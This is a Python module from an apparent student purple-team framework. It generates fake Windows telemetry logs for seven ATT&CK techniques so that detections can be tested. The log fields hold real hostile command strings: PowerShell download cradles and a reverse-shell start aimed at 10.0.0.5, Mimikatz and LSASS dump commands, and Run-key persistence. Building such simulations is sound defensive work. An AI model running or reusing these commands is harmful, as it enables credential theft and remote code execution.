# app/engines/red_engine.py
# Kushagra Patel | Roll No. 2201302012 | Quantum University Roorkee
# LLM-Driven Purple Team Automation Framework — Red Engine (Adversary Simulation)

from __future__ import annotations
import logging
import random
import uuid
from datetime import datetime, timedelta
from app.schema.schema import (
    TechniqueID, TelemetryLog, RedEngineResult, LogSource
)

logger = logging.getLogger(__name__)


# ── Helpers ───────────────────────────────────────────────────────────────────

HOSTNAMES = ["WORKSTATION-01", "DESKTOP-CORP02", "WIN10-HR03", "LAPTOP-DEV04"]
USERNAMES = ["CORP\\jsmith", "CORP\\adavis", "CORP\\SimUser", "CORP\\mwilson"]

def _random_time(within_minutes: int = 30) -> datetime:
    offset = random.randint(0, within_minutes * 60)
    return datetime.utcnow() - timedelta(seconds=offset)

def _pick(lst: list) -> str:
    return random.choice(lst)


# ── T1059.001 — PowerShell ────────────────────────────────────────────────────

def simulate_T1059_001(log_count: int) -> list[TelemetryLog]:
    """Simulate PowerShell execution — encoded commands, download cradles."""

    commands = [
        "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload.ps1')\"",
        "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444)\"",
        "powershell.exe Invoke-Mimikatz -DumpCreds",
    ]

    logs = []
    for _ in range(log_count):
        cmd = _pick(commands)
        ts = _random_time()
        raw = {
            "EventID": 4104,
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "Hostname": _pick(HOSTNAMES),
            "Username": _pick(USERNAMES),
            "ProcessName": "powershell.exe",
            "CommandLine": cmd,
            "ParentProcess": _pick(["explorer.exe", "cmd.exe", "wscript.exe"]),
            "ScriptBlockText": cmd,
            "Timestamp": ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id=TechniqueID.POWERSHELL,
            technique_name="PowerShell Execution",
            timestamp=ts,
            log_source=LogSource.POWERSHELL,
            event_id=4104,
            hostname=raw["Hostname"],
            username=raw["Username"],
            process_name="powershell.exe",
            command_line=cmd,
            parent_process=raw["ParentProcess"],
            raw_log=raw,
        ))
    return logs


# ── T1003.001 — LSASS Memory Dump ────────────────────────────────────────────

def simulate_T1003_001(log_count: int) -> list[TelemetryLog]:
    """Simulate LSASS memory access — mimikatz, procdump, Task Manager dump."""

    process_names = ["mimikatz.exe", "procdump.exe", "taskmgr.exe", "rundll32.exe"]
    commands = [
        "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
        "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\lsass.dmp full",
        "taskmgr.exe /createminidump lsass.exe C:\\Users\\Public\\lsass.dmp",
    ]

    logs = []
    for _ in range(log_count):
        proc = _pick(process_names)
        cmd  = _pick(commands)
        ts = _random_time()
        raw = {
            "EventID": 10,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Hostname": _pick(HOSTNAMES),
            "Username": _pick(USERNAMES),
            "SourceProcessName": proc,
            "TargetProcessName": "lsass.exe",
            "GrantedAccess": "0x1010",
            "CommandLine": cmd,
            "Timestamp": ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id=TechniqueID.LSASS_DUMP,
            technique_name="LSASS Memory Dump",
            timestamp=ts,
            log_source=LogSource.SYSMON,
            event_id=10,
            hostname=raw["Hostname"],
            username=raw["Username"],
            process_name=proc,
            command_line=cmd,
            parent_process="cmd.exe",
            raw_log=raw,
        ))
    return logs


# ── T1547.001 — Registry Run Key Persistence ─────────────────────────────────

def simulate_T1547_001(log_count: int) -> list[TelemetryLog]:
    """Simulate registry persistence — Run key modifications."""

    registry_keys = [
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
        "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Updater",
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SysMonitor",
    ]
    payloads = [
        "C:\\Users\\Public\\svchost32.exe",
        "C:\\Windows\\Temp\\update.exe",
        "powershell.exe -w hidden -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/persist.ps1')\"",
        "C:\\ProgramData\\Microsoft\\backdoor.exe /silent",
    ]
    process_names = ["reg.exe", "regedit.exe", "powershell.exe", "cmd.exe"]

    logs = []
    for _ in range(log_count):
        reg_key = _pick(registry_keys)
        payload = _pick(payloads)
        proc    = _pick(process_names)
        ts = _random_time()
        raw = {
            "EventID": 13,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Hostname": _pick(HOSTNAMES),
            "Username": _pick(USERNAMES),
            "EventType": "SetValue",
            "TargetObject": reg_key,
            "Details": payload,
            "ProcessName": proc,
            "Timestamp": ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id=TechniqueID.REGISTRY_PERSIST,
            technique_name="Registry Run Key Persistence",
            timestamp=ts,
            log_source=LogSource.SYSMON,
            event_id=13,
            hostname=raw["Hostname"],
            username=raw["Username"],
            process_name=proc,
            command_line=f"reg add \"{reg_key}\" /v payload /d \"{payload}\"",
            registry_key=reg_key,
            raw_log=raw,
        ))
    return logs


# ── T1055.001 — DLL Injection (Process Injection) ────────────────────────────

def simulate_T1055_001(log_count: int) -> list[TelemetryLog]:
    """
    Simulate DLL Injection into a legitimate Windows process.
    Attacker injects malicious code into trusted processes like explorer.exe
    so it runs hidden inside a process that antivirus trusts.
    Sysmon Event ID 8 (CreateRemoteThread) captures this activity.
    """

    # These are the legitimate processes attackers commonly hijack
    target_processes = [
        "explorer.exe",
        "svchost.exe",
        "notepad.exe",
        "RuntimeBroker.exe",
    ]

    # These are the attacker's tools doing the injection
    source_processes = [
        "malware_loader.exe",
        "inject.exe",
        "rundll32.exe",
        "regsvr32.exe",
    ]

    # DLL paths the attacker drops on disk before injecting
    dll_paths = [
        "C:\\Users\\Public\\evil.dll",
        "C:\\Windows\\Temp\\svchost_patch.dll",
        "C:\\ProgramData\\update_helper.dll",
        "C:\\Users\\Public\\Documents\\plugin.dll",
    ]

    logs = []
    for _ in range(log_count):
        source = _pick(source_processes)
        target = _pick(target_processes)
        dll    = _pick(dll_paths)
        ts     = _random_time()

        # Sysmon Event 8 = CreateRemoteThread
        # StartAddress is where injected code begins executing in target process
        raw = {
            "EventID"          : 8,
            "Channel"          : "Microsoft-Windows-Sysmon/Operational",
            "Hostname"         : _pick(HOSTNAMES),
            "Username"         : _pick(USERNAMES),
            "SourceProcessName": source,
            "TargetProcessName": target,
            "StartAddress"     : hex(random.randint(0x10000000, 0x7FFFFFFF)),
            "StartModule"      : dll,
            "StartFunction"    : "LoadLibraryA",
            "Timestamp"        : ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id   = TechniqueID.DLL_INJECTION,
            technique_name = "DLL Injection",
            timestamp      = ts,
            log_source     = LogSource.SYSMON,
            event_id       = 8,
            hostname       = raw["Hostname"],
            username       = raw["Username"],
            process_name   = source,
            command_line   = f"CreateRemoteThread into {target} → LoadLibraryA({dll})",
            parent_process = "cmd.exe",
            raw_log        = raw,
        ))
    return logs


# ── T1078 — Valid Accounts (Stolen Credential Login) ─────────────────────────

def simulate_T1078(log_count: int) -> list[TelemetryLog]:
    """
    Simulate attacker logging in with stolen valid credentials.
    No malware involved — attacker simply uses a real username and password
    obtained from phishing or a previous credential dump (like LSASS).
    Windows Security Event ID 4624 (Logon Success) captures this.
    The suspicion comes from unusual source IPs, odd hours, or admin accounts
    logging in from workstations they normally don't touch.
    """

    # Logon types:
    # 3 = Network logon (most common for lateral movement)
    # 10 = RemoteInteractive (RDP session)
    logon_types = ["3", "10"]

    # Attacker source IPs — external or unusual internal addresses
    source_ips = [
        "192.168.50.77",   # unusual internal subnet
        "10.10.10.5",
        "172.16.88.200",
        "192.168.1.254",
    ]

    # High-value accounts attackers love to use after stealing creds
    target_accounts = [
        "CORP\\Administrator",
        "CORP\\svc_backup",
        "CORP\\svc_deploy",
        "CORP\\jsmith_admin",
    ]

    # Workstations these admin accounts should NOT be logging into
    unusual_hosts = [
        "WORKSTATION-01",
        "DESKTOP-CORP02",
        "WIN10-HR03",
        "LAPTOP-DEV04",
    ]

    logs = []
    for _ in range(log_count):
        account    = _pick(target_accounts)
        source_ip  = _pick(source_ips)
        logon_type = _pick(logon_types)
        host       = _pick(unusual_hosts)
        ts         = _random_time()

        raw = {
            "EventID"         : 4624,
            "Channel"         : "Security",
            "Hostname"        : host,
            "TargetUserName"  : account,
            "LogonType"       : logon_type,
            "IpAddress"       : source_ip,
            "IpPort"          : str(random.randint(49152, 65535)),
            "WorkstationName" : host,
            "AuthPackage"     : "NTLM",   # NTLM instead of Kerberos is suspicious
            "Timestamp"       : ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id   = TechniqueID.VALID_ACCOUNTS,
            technique_name = "Valid Accounts — Stolen Credential Logon",
            timestamp      = ts,
            log_source     = LogSource.WINDOWS_EVENT,
            event_id       = 4624,
            hostname       = host,
            username       = account,
            process_name   = "lsass.exe",   # handles authentication on Windows
            command_line   = f"Logon Type {logon_type} | Source IP: {source_ip} | Auth: NTLM",
            parent_process = "winlogon.exe",
            raw_log        = raw,
        ))
    return logs


# ── T1082 — System Information Discovery ─────────────────────────────────────

def simulate_T1082(log_count: int) -> list[TelemetryLog]:
    """
    Simulate system information discovery using native Windows commands.
    Attackers run these commands to enumerate the host after initial access.
    Sysmon Event ID 1 (Process Create) captures process execution.
    """

    discovery_commands = [
        ("systeminfo.exe",  "systeminfo"),
        ("wmic.exe",        "wmic os get Caption,Version,BuildNumber"),
        ("ipconfig.exe",    "ipconfig /all"),
        ("whoami.exe",      "whoami /all /fo list"),
        ("net.exe",         "net user /domain"),
    ]

    logs = []
    for _ in range(log_count):
        proc, cmd = _pick(discovery_commands)
        ts = _random_time()
        raw = {
            "EventID"    : 1,
            "Channel"    : "Microsoft-Windows-Sysmon/Operational",
            "Hostname"   : _pick(HOSTNAMES),
            "Username"   : _pick(USERNAMES),
            "Image"      : f"C:\\Windows\\System32\\{proc}",
            "CommandLine": cmd,
            "ParentImage": _pick(["cmd.exe", "powershell.exe", "explorer.exe"]),
            "Timestamp"  : ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id   = TechniqueID.SYSINFO_DISC,
            technique_name = "System Information Discovery",
            timestamp      = ts,
            log_source     = LogSource.SYSMON,
            event_id       = 1,
            hostname       = raw["Hostname"],
            username       = raw["Username"],
            process_name   = proc,
            command_line   = cmd,
            parent_process = raw["ParentImage"],
            raw_log        = raw,
        ))
    return logs


# ── T1071.001 — Application Layer Protocol: Web Protocols (C2 over HTTP/S) ───

def simulate_T1071_001(log_count: int) -> list[TelemetryLog]:
    """
    Simulate command-and-control communication over HTTP/HTTPS.
    Attacker-controlled processes make outbound network connections to C2 servers.
    Sysmon Event ID 3 (Network Connection) captures this activity.
    """

    c2_ips = [
        "185.220.101.55",
        "45.142.212.10",
        "104.21.88.12",
        "198.199.65.43",
    ]

    # C2 often hides on standard web ports or non-standard ports
    c2_ports = [80, 443, 8080, 8443, 4444, 1337]

    source_processes = [
        "powershell.exe",
        "rundll32.exe",
        "regsvr32.exe",
        "cmd.exe",
    ]

    logs = []
    for _ in range(log_count):
        proc = _pick(source_processes)
        c2   = _pick(c2_ips)
        port = _pick(c2_ports)
        ts   = _random_time()

        raw = {
            "EventID"          : 3,
            "Channel"          : "Microsoft-Windows-Sysmon/Operational",
            "Hostname"         : _pick(HOSTNAMES),
            "Username"         : _pick(USERNAMES),
            "Image"            : f"C:\\Windows\\System32\\{proc}",
            "DestinationIp"    : c2,
            "DestinationPort"  : port,
            "Protocol"         : "tcp",
            "Initiated"        : "true",
            "Timestamp"        : ts.isoformat(),
        }
        logs.append(TelemetryLog(
            technique_id   = TechniqueID.WEB_PROTOCOL_C2,
            technique_name = "C2 over Web Protocols",
            timestamp      = ts,
            log_source     = LogSource.SYSMON,
            event_id       = 3,
            hostname       = raw["Hostname"],
            username       = raw["Username"],
            process_name   = proc,
            command_line   = f"outbound TCP {c2}:{port}",
            parent_process = "explorer.exe",
            raw_log        = raw,
        ))
    return logs


# ── Main Red Engine Class ─────────────────────────────────────────────────────

class RedEngine:
    """
    Adversary simulation engine.
    Accepts a TechniqueID, returns a RedEngineResult with fake telemetry logs.
    """

    TECHNIQUE_MAP = {
        TechniqueID.POWERSHELL:       simulate_T1059_001,
        TechniqueID.LSASS_DUMP:       simulate_T1003_001,
        TechniqueID.REGISTRY_PERSIST: simulate_T1547_001,
        TechniqueID.DLL_INJECTION:    simulate_T1055_001,
        TechniqueID.VALID_ACCOUNTS:   simulate_T1078,
        TechniqueID.SYSINFO_DISC:     simulate_T1082,
        TechniqueID.WEB_PROTOCOL_C2:  simulate_T1071_001,
    }

    def run(self, technique_id: TechniqueID, log_count: int = 5) -> RedEngineResult:
        simulator = self.TECHNIQUE_MAP.get(technique_id)
        if not simulator:
            raise ValueError(f"Unsupported technique: {technique_id}")

        logs = simulator(log_count)

        return RedEngineResult(
            technique_id=technique_id,
            logs=logs,
        )


# ── Quick Self-Test ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    engine = RedEngine()

    for tid in TechniqueID:
        result = engine.run(tid, log_count=2)
        logger.info("Technique: %s | logs: %d | sample: %s",
                    result.technique_id, result.log_count, result.logs[0].command_line)